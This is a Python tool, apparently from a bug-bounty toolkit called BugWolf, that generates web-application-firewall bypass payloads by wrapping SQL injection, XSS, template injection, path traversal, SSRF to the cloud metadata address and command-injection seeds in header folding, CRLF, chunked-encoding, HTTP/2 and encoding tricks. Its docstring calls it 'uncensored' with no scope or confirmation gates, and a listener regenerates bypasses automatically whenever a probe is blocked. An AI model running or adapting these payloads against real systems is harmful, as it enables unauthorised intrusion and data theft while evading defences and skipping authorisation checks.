#!/usr/bin/env python3
"""BugWolf Parser-Differential WAF Bypass Generator (P0, Week 1).

WAFFLED-style (arXiv 2503.10846 — 1,207 bypasses from structural parsing
discrepancies) payload *family* generator: given the detected stack from
``tech-fingerprint.json``, this tool emits WAF-bypass payload families built
from parsing divergences — header folding, CR/LF variants, tab-in-header,
whitespace/parameter splitting, chunked framing, HTTP/2 pseudo-header order,
encoding/character-set obfuscations.

Design (deterministic core, uncensored, event-driven):

  * Deterministic: same stack + bug class => identical payload families.
  * Event-driven: registers a ``WAF_BLOCKED`` listener (and exposes it for
    tests / the orchestrator) so the moment a hunt probe is blocked the bus
    triggers regeneration scoped to the reported defense + bug class.
  * Output: ``research/<target>/bypass/waf-payloads-<stack>.json`` — the
    ``bypass`` research checkpoint artifact and a ``coverage-plan`` input.
  * Uncensored: no scope/confirmation gates; the tool only writes payload
    families (execution is the operator's decision).

Usage:
  python3 tools/domains/web/parser_differential.py --target acme --stack "nginx,php-fpm"
  python3 tools/domains/web/parser_differential.py --target acme --defense Cloudflare --bug-class sqli
  python3 tools/domains/web/parser_differential.py --target acme --listen-waf  # attach bus listener
  python3 tools/domains/web/parser_differential.py --target acme --json
"""

import json
import re
import sys
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

def _repo_root() -> Path:
    """Walk up from this module until the tools/ package root is found."""
    current = Path(__file__).resolve().parent
    while current != current.parent:
        if (current / "tools" / "runtime_paths.py").is_file():
            return current
        current = current.parent
    return current

_CODE_ROOT = _repo_root()
if str(_CODE_ROOT) not in sys.path:
    sys.path.insert(0, str(_CODE_ROOT))
from tools.runtime_paths import workspace_root

try:
    from tools.core.signal_bus import SignalBus, WAF_BLOCKED
except ImportError:  # direct script execution
    from tools.core.signal_bus import SignalBus, WAF_BLOCKED

SCHEMA = "bugwolf/parser-differential/v1"

# ---------------------------------------------------------------------------
# Parser-differential categories (WAFFLED taxonomy subset, deterministic)
# ---------------------------------------------------------------------------

# Each category produces payload templates with {payload} substituted.
CATEGORIES: Dict[str, Dict[str, Any]] = {
    "header_folding": {
        "name": "Header folding (obsolete line folding)",
        "reason": "Front-end unfolds the header, back-end rejects/ignores the "
                  "folded form — classic parser disagreement.",
        "templates": [
            "X-{param}:\r\n {payload}",
            "X-{param}:\r\n\t{payload}",
            "X-{param}: \r\n{payload}",
        ],
    },
    "crlf_variants": {
        "name": "CR/LF variants",
        "reason": "Lone CR or LF delimiters parse differently per stack.",
        "templates": [
            "{payload}\r",
            "{payload}\n",
            "{payload}\r\n\r",
            "{payload}\u000d",
        ],
    },
    "tab_in_header": {
        "name": "Tab / whitespace injection in header values",
        "reason": "WAF regexes anchored to spaces miss tab-separated values.",
        "templates": [
            "{param}:\t{payload}",
            "{param}:\t\t{payload}",
            "{param}:\u0009{payload}",
        ],
    },
    "parameter_splitting": {
        "name": "Parameter splitting & duplicate parameters",
        "reason": "Front-end uses first value, back-end last (or joins) — "
                  "signatures match the single-parameter form only.",
        "templates": [
            "{param}=x&{param}={payload}",
            "{param}[]={payload}",
            "{param}={payload}&{param}=x",
            "{param};{param}={payload}",
        ],
    },
    "chunked_framing": {
        "name": "Chunked-transfer framing tricks",
        "reason": "Chunk-size parser divergence (hex case, extensions) hides "
                  "the payload from the WAF body inspection.",
        "templates": [
            "0\r\n\r\n{payload}",
            "00\r\n\r\n{payload}",
            "1;ext=1\r\nx\r\n0\r\n\r\n{payload}",
            "f\r\n{payload}\r\n0\r\n\r\n",
        ],
    },
    "encoding_obfuscation": {
        "name": "Encoding / character-set obfuscation",
        "reason": "Unicode, UTF-16, overlong UTF-8 and mixed-case sequences "
                  "decode differently between layers.",
        "templates": [
            "%u{payload_hex}",
            "\ufffd{payload}",
            "{payload_utf16}",
            "&#{payload_decimal};",
        ],
    },
    "http2_pseudo_header": {
        "name": "HTTP/2 pseudo-header order & :path tricks",
        "reason": "H2 :path/:method ordering and case differ from the H1 "
                  "form the WAF signature expects.",
        "templates": [
            ":path: /{payload}\r\n:method: GET",
            ":method: GET\r\n:path: /{payload}",
            ":path: /%2f{payload}",
        ],
    },
}

# Payload seeds per bug class (deterministic; the mutator adds more).
BUG_CLASS_SEEDS: Dict[str, List[str]] = {
    "sqli": ["' OR 1=1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--"],
    "xss": ["<script>alert(1)</script>", "\"><svg onload=alert(1)>",
            "javascript:alert(1)"],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "idor": ["../../etc/passwd", "/../admin", "id=0"],
    "ssrf": ["http://169.254.169.254/latest/meta-data/",
             "http://127.0.0.1:8080/admin"],
    "cmdi": [";id", "|id", "$(id)", "`id`"],
}

DEFAULT_BUG_CLASS = "sqli"

# Frameworks/WAFs this generator knows how to profile.
KNOWN_STACKS = ("nginx", "apache", "cloudflare", "akamai", "aws", "fastly",
                "varnish", "traefik", "istio", "envoy", "haproxy", "f5",
                "imperva", "modsecurity")


def _slugify(value: str) -> str:
    slug = re.sub(r"[^A-Za-z0-9._-]+", "-", value).strip("-")
    return (slug or "unknown")[:60]


def _payload_hex(payload: str) -> str:
    return "".join(f"{ord(ch):04x}" for ch in payload)


def _payload_utf16(payload: str) -> str:
    """Return a UTF-16-BE escaped form (backslash-uXXXX per char)."""
    return "".join("\\u%04x" % ord(ch) for ch in payload)


def _payload_decimal(payload: str) -> str:
    return ";".join(str(ord(ch)) for ch in payload)


@dataclass
class PayloadFamily:
    category: str
    category_name: str
    reason: str
    payloads: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class WafPayloadSet:
    target: str
    stack: str
    defense: str
    bug_classes: List[str]
    generated_at: str
    families: List[PayloadFamily] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "schema": SCHEMA,
            "target": self.target,
            "stack": self.stack,
            "defense": self.defense,
            "bug_classes": self.bug_classes,
            "generated_at": self.generated_at,
            "family_count": len(self.families),
            "payload_count": sum(len(f.payloads) for f in self.families),
            "families": [f.to_dict() for f in self.families],
        }


def load_stack_fingerprint(target: str, *, project_root: Optional[str] = None,
                           base_dir: Optional[str] = None) -> Dict[str, Any]:
    """Read recon/<target>/tech-fingerprint.json (returns {} on absence)."""
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    path = root / "recon" / (re.sub(r"[^\w.-]+", "_", target) or "default") / \
        "tech-fingerprint.json"
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else {}
    except (OSError, json.JSONDecodeError):
        return {}


def _stack_hint(fingerprint: Dict[str, Any]) -> str:
    """Best-effort stack label from the fingerprint for the output filename."""
    candidates: List[str] = []
    blob = json.dumps(fingerprint).lower()
    for known in KNOWN_STACKS:
        if known in blob:
            candidates.append(known)
    return "-".join(candidates[:2]) if candidates else "unknown"


def generate(target: str, *, stack: str = "", defense: str = "",
             bug_classes: Optional[List[str]] = None,
             fingerprint: Optional[Dict[str, Any]] = None,
             categories: Optional[List[str]] = None) -> WafPayloadSet:
    """Deterministically generate payload families for the given context."""
    fingerprint = fingerprint or {}
    stack_hint = stack.strip() or _stack_hint(fingerprint)
    bug_classes = [b.strip().lower() for b in (bug_classes or []) if b.strip()]
    if not bug_classes:
        bug_classes = [DEFAULT_BUG_CLASS]
    selected_categories = categories or sorted(CATEGORIES)

    families: List[PayloadFamily] = []
    for category in selected_categories:
        if category not in CATEGORIES:
            continue
        spec = CATEGORIES[category]
        payloads: List[str] = []
        for bug_class in bug_classes:
            seeds = BUG_CLASS_SEEDS.get(bug_class, BUG_CLASS_SEEDS[DEFAULT_BUG_CLASS])
            for seed in seeds:
                for template in spec["templates"]:
                    rendered = template.format(
                        payload=seed, param="x" if not stack_hint else "q",
                        payload_hex=_payload_hex(seed),
                        payload_utf16=_payload_utf16(seed),
                        payload_decimal=_payload_decimal(seed))
                    payloads.append(rendered)
        families.append(PayloadFamily(
            category=category, category_name=spec["name"],
            reason=spec["reason"], payloads=payloads))
    return WafPayloadSet(
        target=target, stack=stack_hint, defense=defense.strip(),
        bug_classes=bug_classes,
        generated_at=datetime.now(timezone.utc).isoformat(),
        families=families)


def write_payloads(payload_set: WafPayloadSet, *, project_root: Optional[str] = None,
                   base_dir: Optional[str] = None) -> Path:
    """Persist to research/<target>/bypass/waf-payloads-<stack>.json."""
    if base_dir:
        root = Path(base_dir)
    else:
        root = workspace_root(project_root)
    target_slug = re.sub(r"[^\w.-]+", "_", payload_set.target) or "default"
    out_dir = root / "research" / target_slug / "bypass"
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / f"waf-payloads-{_slugify(payload_set.stack)}.json"
    out_path.write_text(json.dumps(payload_set.to_dict(), indent=2) + "\n",
                        encoding="utf-8")
    return out_path


def make_waf_blocked_listener(target: str, *, project_root: Optional[str] = None,
                              base_dir: Optional[str] = None) -> Any:
    """Return a WAF_BLOCKED listener that regenerates payload families.

    The listener writes a fresh payload set scoped to the defense + bug class
    reported in the event — this is the ``parser_differential`` reaction that
    the event bus wires up (a tool reacting to a signal instead of being
    called directly).
    """
    def on_waf_blocked(event: Any) -> None:
        payload = getattr(event, "payload", {}) or {}
        defense = str(payload.get("defense", ""))
        bug_class = str(payload.get("bug_class", ""))
        bug_classes = [bug_class] if bug_class else None
        fingerprint = load_stack_fingerprint(target, project_root=project_root,
                                             base_dir=base_dir)
        generated = generate(target, defense=defense,
                             bug_classes=bug_classes,
                             fingerprint=fingerprint)
        write_payloads(generated, project_root=project_root, base_dir=base_dir)
    return on_waf_blocked


def main() -> int:
    import argparse
    parser = argparse.ArgumentParser(
        description="BugWolf Parser-Differential WAF Bypass Generator (P0)")
    parser.add_argument("--target", required=True, help="Target name")
    parser.add_argument("--stack", default="",
                        help="Detected stack (default: from tech-fingerprint.json)")
    parser.add_argument("--defense", default="",
                        help="WAF/defense name (e.g. Cloudflare)")
    parser.add_argument("--bug-class", action="append", default=[],
                        help="Bug class to seed payloads for (repeatable)")
    parser.add_argument("--listen-waf", action="store_true",
                        help="Attach a WAF_BLOCKED listener and stay resident "
                             "(replay existing WAF_BLOCKED events first)")
    parser.add_argument("--categories", default="",
                        help="Comma-separated category subset (default: all)")
    parser.add_argument("--project-root", default=None,
                        help="Workspace root (default: cwd)")
    parser.add_argument("--json", action="store_true", help="Emit strict JSON")
    args = parser.parse_args()

    fingerprint = load_stack_fingerprint(args.target, project_root=args.project_root)
    categories = [c.strip() for c in args.categories.split(",") if c.strip()] or None
    generated = generate(
        args.target, stack=args.stack, defense=args.defense,
        bug_classes=args.bug_class, fingerprint=fingerprint,
        categories=categories)

    if args.listen_waf:
        listener = make_waf_blocked_listener(args.target,
                                             project_root=args.project_root)
        bus = SignalBus(args.target, project_root=args.project_root)
        bus.subscribe(WAF_BLOCKED, listener)
        # Replay persisted WAF_BLOCKED events so a late-starting process
        # regenerates payloads for blockers already observed.
        replayed = bus.replay(dispatch=True)
        output = {
            "schema": SCHEMA,
            "ok": True,
            "target": args.target,
            "listening": True,
            "replayed_events": len(replayed),
            "listener_ready": True,
        }
        print(json.dumps(output, indent=2) if args.json else
              f"[+] {args.target}: WAF_BLOCKED listener attached "
              f"(replayed {len(replayed)} events)")
        return 0

    out_path = write_payloads(generated, project_root=args.project_root)
    output = {
        "schema": SCHEMA,
        "ok": True,
        "target": args.target,
        "stack": generated.stack,
        "defense": generated.defense,
        "bug_classes": generated.bug_classes,
        "payload_count": sum(len(f.payloads) for f in generated.families),
        "family_count": len(generated.families),
        "output_file": str(out_path),
        "families": [f.to_dict() for f in generated.families],
    }
    print(json.dumps(output, indent=2) if args.json else
          f"[+] {args.target} ({generated.stack}): "
          f"{output['payload_count']} bypass payloads in "
          f"{output['family_count']} families -> {out_path}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
